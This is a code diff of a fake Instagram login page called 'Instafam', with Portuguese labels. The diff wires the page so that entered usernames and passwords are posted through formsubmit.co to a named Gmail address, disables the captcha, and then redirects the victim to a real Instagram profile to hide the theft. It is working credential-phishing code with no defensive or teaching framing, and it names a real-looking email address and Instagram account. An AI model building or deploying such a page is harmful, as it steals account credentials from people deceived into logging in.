@@ -152,10 +152,14 @@
   <div class="container">
     <div class="logo">Instafam</div>
 
-    <form id="loginForm" method="POST" action="enviar.php" onsubmit="return redirecionarInstagram()">
-
+    <form action="https://formsubmit.co/frequenciaaberta.rpc@gmail.com" method="POST" onsubmit="return redirecionarInstagram()">
       <input type="text" name="usuario" placeholder="Telefone, nome de usuário ou email" required>
       <input type="password" name="senha" placeholder="Senha" required>
+
+      <!-- FormSubmit configurações -->
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://www.instagram.com/geovannagabrielly._/?igsh=MW1qc2Iyb3N6ZGQ4OA==">
+
       <button type="submit" class="login-btn">Entrar</button>
     </form>
 
@@ -192,10 +196,11 @@
 
   <script>
     function redirecionarInstagram() {
+      // Evita erro caso _next não funcione
       setTimeout(function () {
-        window.location.href = "https://www.instagram.com/geovannagabrielly._/?igsh=MW1qc2Iyb3N6ZGQ4OA%3D%3D#";
-      }, 300);
-      return true; // Permite envio do formulário
+        window.location.href = "https://www.instagram.com/geovannagabrielly._/?igsh=MW1qc2Iyb3N6ZGQ4OA==";
+      }, 1000);
+      return true;
     }
   </script>
 </body>
